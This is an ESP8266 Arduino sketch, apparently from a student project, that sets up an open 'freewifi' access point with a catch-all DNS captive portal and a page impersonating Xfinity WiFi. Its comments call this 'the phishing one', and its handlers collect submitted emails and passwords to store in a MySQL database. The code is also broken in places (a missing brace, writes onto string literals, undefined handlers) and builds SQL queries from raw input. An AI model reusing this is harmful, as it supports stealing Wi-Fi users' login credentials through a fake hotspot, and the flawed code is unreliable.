#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <time.h>
#include <EEPROM.h>
#include <MySQL_Connection.h>
#include <MySQL_Cursor.h>
//qjxu4534 is the old password
/*To allow us to change the wifi name, we can have two seperate websites.
 * One of the websites will be for changing the ssid, as well as wifi credentials to 
 * connect to the phones wifi.
 * 
 * We will check and see if the module has connected to a database. 
 * Case 1: Wifi Connection & Database Connection (pass true)
 *    - The website should be the phishing one
 *    
 * Case 2: Wifi connected & no DB connection (Pass false)
 *    - Website to change credentials
 * Case 3: No Wifi Connection (Pass false)
 *    - Website to change Credentials
 */
// Replace with your network credentials
const char W_HTML[] PROGMEM = "text/html";
char *passwordHost = "00000000"; // IP of the MySQL *server* here
char* user = "root";         // MySQL user login username
const IPAddress apIp(192, 168, 0, 1);
DNSServer dnsServer;
char* dbpass = "root";
int LED = 2;
WiFiClient client;
ESP8266WebServer server(80);
MySQL_Connection conn((Client *)&client);
bool wificonnect = true;
bool dbConn = true;
bool hosting = false;
int ip[4] = {127, 0, 0, 1};
int dbQueryCnt = 0;
String st;
// For scenes
String content;
MDNSResponder mdns;
int statusCode;
char ssid[32];
char password[32];
char ipAddr[16];//Pi Access Point IP-Adr.
int count = 0;
void parseIP(){
  String addr(ipAddr);
  if(addr.length() > 0){
    Serial.println("parse IP");
  char* newIP = strtok(ipAddr, ".");
  Serial.println(addr);
  for(int i = 0; i < 4; i++){
    ip[i] = atoi(newIP);
    newIP = strtok(0, ".");
  }
  }else{
    ip[0] = 127;
    ip[1] = 0;
    ip[2] = 0;
    ip[3] = 1; 
  }
 }
bool tryConnDB(){
  parseIP();
  int test = 0;
  IPAddress server_addr(ip[0], ip[1], ip[2], ip[3]);
  if(WiFi.status() == WL_CONNECTED){
    Serial.println("Attempting to Conn to DB");
 if (!conn.connect(server_addr, 3306, user, dbpass)){
    //Serial.println(WiFi.status());
    Serial.println("no dbconnection");
    return false;
 }else{
      Serial.println(".");
 MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
 cur_mem->execute("use SeniorProject;");
 Serial.println("db Conn!");
 return true;
  }
}
}

bool tryConn(){
  wificonnect = true;
  EEPROM.begin(512);
  WiFi.begin(ssid, password);
  Serial.println("");
  int count = 0; // Holds the timing variable.
  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    count = count + 1;
    if( count >= 10){
      wificonnect = false;
      break;
    }
  }
  Serial.println(wificonnect);
 if(wificonnect){
    Serial.println("Connected to Wifi!");
    WiFi.softAPdisconnect(true);
    Serial.println("Stopped AP"); 
    if(tryConnDB()){
      dbConn = true;
    }else{
      dbConn = false;
    }
    hosting = false;

}
return wificonnect;
}

void hostWifi(int type){
  if(type == 1){
  String ssidHost = "HARP ESP-";
  byte mac[6];
  WiFi.macAddress(mac);
  ssidHost += String(mac[5], HEX);
  const char* newssid = ssidHost.c_str();
  Serial.println("Did not connect!");
    IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
 // server.on("/", createWebServer);
  createWebServer(1);
  server.begin();
  Serial.println("HTTP server started");
  hosting = true;
}else{
  SPIFFS.begin();

  WiFi.persistent(false);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
  WiFi.softAP("freewifi", nullptr, 1);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIp);

  server.on("/", httpHome);
  server.on("/connect", httpConnect);
  server.on("/pure.css", httpPureCss);
  server.onNotFound(httpDefault);
  server.begin();
}

void readWifi(){
  readEEPROM(0,32,ssid);
  readEEPROM(32,32,password);
  readEEPROM(64,16,ipAddr);
  Serial.println(ipAddr);
}
//setup function
void setup(void){ 

  EEPROM.begin(512);
  //if(rebootInt == 6){
  //}else{
  readWifi();
  Serial.println("Here");
  //}
  WiFi.begin(ssid, password);
  
  //WiFi.setAutoReconnect(false);
  pinMode(LED, OUTPUT);
  // preparing GPIOs
  Serial.begin(115200);
  delay(100);
 if (!tryConn()){
    hostWifi();
  }else{
  createWebServer(1);
  server.begin();
  }
}
 
void loop(void){
  if(WiFi.status() == WL_CONNECTED){
    digitalWrite(LED, LOW);
    if(hosting){
      hosting = false;
      WiFi.softAPdisconnect(true);
    }
    if (dbConn){
    //Serial.println("high");
   }
  }else if(!hosting){
    hostWifi();
  }else{
    tryConn();
  }
  server.handleClient();
}


void queryDB(bool insert, const char* email, const char* domain, const char* password){
 delay(50);
 digitalWrite(LED, HIGH);
 if(WiFi.status() != WL_CONNECTED){
  wificonnect = false;
 }else{
  char* query;
  wificonnect = true; 
   //Serial.println("\nRunning SELECT and printing results\n");
  // Initiate the query class instance
  MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
  if(insert){
  query = "Insert into Info (ID, email, domain, password, verified) values (0, '";
  strcat(query, email);
  }
  cur_mem->execute(query);
  // Fetch the columns and print them
  column_names *cols = cur_mem->get_columns();
  // printing the column names.
  if(cols != NULL){
  for (int f = 0; f < cols->num_fields; f++) {
    //Serial.print(cols->fields[f]->name);
    if (f < cols->num_fields-1) {
      //Serial.print(", ");
    }
  }
  }
  // Read the rows and print them
  row_values *row = NULL;
  do {
    row = cur_mem->get_next_row();
    if (row != NULL) {
      String mac = row->values[0];
        if(mac == WiFi.macAddress()){
          gpio(atoi(row->values[1]), atof(row->values[2]), row->values[3]);
         //Serial.println("Made it here");
          }
       }
  } while (row != NULL);
  delete cur_mem;
 }
}
//This function is passed a pin and state to determine if it is to be shut off or turned on.
void gpio(int pin, float state, String type){
  pinMode(pin, OUTPUT);
  Serial.println(type);
  if (type == "F"){
    //Serial.println("Fan");
    int turns = state * 1023;
  analogWrite(pin, turns);
  }else{
  if(state == 1 && digitalRead(pin) < 1){
    digitalWrite(pin, HIGH);
  }else if(state == 0 && digitalRead(pin) > 0){
    digitalWrite(pin, LOW);
  }else if(state != 1 && state != 0){
    int turns = state * 255;
    analogWrite(pin, turns);
  }
  }
}


void createWebServer(int webtype)
{
  if ( webtype == 1 ) {
    server.on("/", []() {
        IPAddress ip = WiFi.softAPIP();
        String ipStr = String(ip[0]) + '.' + String(ip[1]) + '.' + String(ip[2]) + '.' + String(ip[3]);
        content = "<!DOCTYPE HTML>\r\n<html>Hello from ESP8266 at ";
        content += ipStr;
        content += "<br/><label>My MAC Address is: ";
        content += WiFi.macAddress();
        content += "</label><br/>";
        content += "<p>";
        content += st;
        content += "</p><form method='get' action='setting'><label>SSID: </label><input name='ssid' length=32><br /><label>Password: </label><input name='pass' length=64>";
        content += "<br/><label>Pi IP Address: </label><input name='dbip' length=64><label> (Seperate with '.') </label><input type='submit'></form>";
        content += "</html>";
        server.send(200, "text/html", content);  
    });
    server.on("/setting", []() {
        String qsid = server.arg("ssid");
        String qpass = server.arg("pass");
        String qip = server.arg("dbip");
        if (qsid.length() > 0 && qpass.length() > 0) {
          Serial.println("clearing eeprom");
          for (int i = 0; i < 96; ++i) { EEPROM.write(i, 0); }
          Serial.println("writing eeprom ssid:");
          writeEEPROM(0,32,qsid);
          Serial.println("writing eeprom pass:");
          writeEEPROM(32,32,qpass);
          Serial.println("writing eeprom ip:");
          writeEEPROM(64,16,qip); 
          EEPROM.commit();
          content = "{\"Success\":\"saved to eeprom... reset to boot into new wifi\"}";
          statusCode = 200;
          delay(200);
          WiFi.disconnect();
          readWifi();
          tryConn();
        } else {
          content = "{\"Error\":\"404 not found\"}";
          statusCode = 404;
          Serial.println("Sending 404");
        }
        server.send(statusCode, "application/json", content);
    });
  } else if (webtype == 0) {
    const char* username = "";
    const char* domain = "";
 server.on(String(F("/xfinitywifi.html")).c_str(), HTTP_GET, []() {
  
        server.send(200, "text/html", content); 
    });
    server.on("/setting", []() {
        String tempemail = server.arg("email");
        char email[50];
        tempemail.toCharArray(email, 50);
        String pass = server.arg("pass");
        char *splitEmail = strtok(email, "@");
        username = splitEmail;
        domain = strtok(NULL, "@");
        if (pass.length() > 0) {
          // Do a query here and insert it
          //queryDB(true, username, domain, password);
        } else {
          content = "{\"Error\":\"404 not found\"}";
          statusCode = 404;
          Serial.println("Sending 404");
        }
        server.send(statusCode, "application/json", content);
    });
     delay(1000);
    char* query;
  wificonnect = true; 
   //Serial.println("\nRunning SELECT and printing results\n");
  // Initiate the query class instance
  MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
  query = "Select * from Info where username = ";
  strcat(query, username);
  strcat(query," and domain = ");
  strcat(query, domain);
  strcat(query, " and verified = 1;");
  cur_mem->execute(query);
  }
}



//startAdr: offset (bytes), writeString: String to be written to EEPROM
void writeEEPROM(int startAdr, int laenge, String writeString) {
  EEPROM.begin(512);
  yield();
  Serial.println();
  Serial.print("writing EEPROM: ");
  //write to eeprom 
  for (int i = 0; i < laenge; i++)
    {
      EEPROM.write(startAdr + i, writeString[i]);
      Serial.print(writeString[i]);
    }
  EEPROM.commit();
  EEPROM.end();           
}

void readEEPROM(int startAdr, int maxLength, char* dest) {
  
  EEPROM.begin(512);
  delay(10);
  for (int i = 0; i < maxLength; i++)
    {
      dest[i] = char(EEPROM.read(startAdr + i));
    }
  EEPROM.end();    
  Serial.print("ready reading EEPROM:");
  Serial.println(dest);
}
